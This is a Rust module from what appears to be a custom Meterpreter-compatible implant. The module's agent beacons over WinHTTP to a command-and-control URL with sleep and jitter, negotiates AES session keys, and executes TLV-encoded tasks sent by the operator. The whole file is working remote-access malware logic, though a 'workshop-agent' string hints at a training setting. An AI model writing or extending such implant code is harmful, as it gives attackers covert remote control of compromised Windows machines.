use crate::agent::core::config::AgentConfig;
use crate::agent::core::runtime::{run_loop, TaskDispatcher};
use crate::agent::core::tasking;
use crate::agent::core::meterpreter_winapi::{decode_frame, encode_frame};
use crate::agent::transport::http_winhttp::{winhttp_from_url, WinHttpTransport};
use core_defs::packer::MpTlv;
use rand::RngCore;

pub fn run(url: &str) -> u32 {
    run_with_options(url, None, None, None)
}

pub fn run_with_options(
    url: &str,
    sleep_ms: Option<u64>,
    jitter_pct: Option<u8>,
    max_iterations: Option<u64>,
) -> u32 {
    let mut cfg = AgentConfig::new(url.to_string());
    let norm = cfg.normalized_url();
    let cfg_http = match winhttp_from_url(&norm, Some("workshop-agent".to_string()), None) {
        Ok(c) => c,
        Err(_) => return 1,
    };

    if let Some(ms) = sleep_ms {
        cfg.sleep = core::time::Duration::from_millis(ms);
    }
    if let Some(j) = jitter_pct {
        cfg.jitter_pct = j;
    }

    let mut rng = rand::thread_rng();
    let mut transport = WinHttpTransport::new(cfg_http);
    let mut dispatcher = MeterpreterDispatcher::new();

    let res = run_loop(
        &mut transport,
        &mut dispatcher,
        &mut cfg,
        &mut rng,
        max_iterations,
    );

    match res {
        Ok(()) => 0,
        Err(e) => {
            #[cfg(debug_assertions)]
            {
                eprintln!("agent error: {e:?}");
            }
            2
        }
    }
}

struct MeterpreterDispatcher {
    guid: [u8; 16],
    aes_key: Option<[u8; 32]>,
    aes_enabled: bool,
    desired_sleep_ms: Option<u32>,
    desired_jitter_pct: Option<u8>,
}

impl MeterpreterDispatcher {
    fn new() -> Self {
        Self {
            guid: [0u8; 16],
            aes_key: None,
            aes_enabled: false,
            desired_sleep_ms: None,
            desired_jitter_pct: None,
        }
    }

    fn ensure_guid(&mut self) {
        if self.guid == [0u8; 16] {
            rand::thread_rng().fill_bytes(&mut self.guid);
        }
    }
}

impl TaskDispatcher for MeterpreterDispatcher {
    fn checkin_request(&mut self) -> Vec<u8> {
        self.ensure_guid();
        const PACKET_TYPE_REQUEST: u32 = 0;
        let tlvs: &[MpTlv] = &[];
        encode_frame(self.guid, PACKET_TYPE_REQUEST, tlvs, None)
    }

    fn dispatch(
        &mut self,
        bytes: Vec<u8>,
    ) -> Result<Option<Vec<u8>>, crate::agent::core::runtime::RuntimeError> {
        if bytes.is_empty() {
            return Ok(None);
        }

        let key_opt = if self.aes_enabled {
            self.aes_key.as_ref()
        } else {
            None
        };

        let (hdr, tlvs) = match decode_frame(&bytes, key_opt) {
            Ok(v) => v,
            Err(_) => return Ok(None),
        };

        self.guid = hdr.session_guid;
        let res = tasking::dispatch_tlvs(&tlvs);

        self.desired_sleep_ms = res.new_sleep_ms;
        self.desired_jitter_pct = res.new_jitter_pct;

        if res.result == 50 {
            return Ok(None);
        }

        const PACKET_TYPE_RESPONSE: u32 = 1;
        let encrypt = self.aes_enabled && res.new_aes_key.is_none();
        let resp_key = if encrypt { self.aes_key.as_ref() } else { None };
        let out = encode_frame(self.guid, PACKET_TYPE_RESPONSE, &res.tlvs, resp_key);

        if let Some(k) = res.new_aes_key {
            self.aes_key = Some(k);
            self.aes_enabled = true;
        }

        Ok(Some(out))
    }

    fn update_config(&mut self, cfg: &mut AgentConfig) {
        if let Some(ms) = self.desired_sleep_ms.take() {
            cfg.sleep = core::time::Duration::from_millis(ms as u64);
        }
        if let Some(j) = self.desired_jitter_pct.take() {
            cfg.jitter_pct = j;
        }
    }
}
